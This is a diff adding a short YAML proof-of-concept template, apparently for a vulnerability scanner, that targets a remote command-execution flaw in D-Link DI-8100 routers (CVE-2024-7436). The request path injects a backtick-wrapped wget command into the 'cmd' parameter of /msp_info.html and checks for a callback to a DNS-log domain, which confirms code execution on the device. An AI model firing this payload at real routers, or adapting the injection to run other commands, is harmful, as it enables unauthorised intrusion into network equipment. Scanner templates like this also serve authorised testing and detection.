@@ -1,0 +1,18 @@
+id: poc-yaml-d-link-di-8100-rce
+info:
+  name: D-LINK-DI-8100远程命令执行漏洞(CVE-2024-7436)
+  severity: high
+  tags:
+  - DNSLOG
+  - rce
+  - CVE-2024-7436
+  finger: d-link
+  fofa: null
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /msp_info.html?flag=cmd&cmd=123`wget%20http://{{.reverseDomain}}`
+  expression: reverse.Verify()
+transport: http
